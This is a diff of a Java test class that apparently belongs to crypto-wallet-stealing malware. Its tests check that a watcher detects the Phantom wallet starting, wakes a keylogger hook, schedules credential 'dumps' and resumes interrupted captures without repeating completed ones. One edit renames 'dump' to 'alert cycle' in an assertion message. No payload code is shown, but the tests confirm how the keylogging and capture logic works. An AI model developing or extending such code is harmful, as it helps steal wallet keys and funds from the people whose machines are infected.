@@ -140,8 +140,29 @@ class WalletWatcherTest {
 		watcher.detect("phantom", pid, "start", "Phantom");
 
 		assertEquals(List.of(), notifier.queued(), "no second alert inside the cooldown");
-		assertEquals(1, watcher.dumpSchedules, "no second dump for the same session");
+		assertEquals(1, watcher.dumpSchedules, "no second alert cycle for the same session");
+		assertEquals(1, watcher.resumeSchedules, "the interrupted capture is resumed");
 		assertEquals(2, keylogger.walletOnCalls, "the hook is woken again");
+	}
+
+	@Test
+	void reopenAfterACompletedDumpDoesNotRepeatIt() throws Exception {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		markKeysRunning();
+		watcher.detect("phantom", pid, "start", "Phantom");
+		String key = "phantom|" + pid + "|start";
+		watcher.completed.add(key);
+		notifier.queued();
+		watcher.lost("phantom", "grace");
+		notifier.queued();
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of(), notifier.queued());
+		assertEquals(0, watcher.resumeSchedules, "a completed capture is not repeated");
+		assertEquals(1, watcher.dumpSchedules);
 	}
 
 	@Test
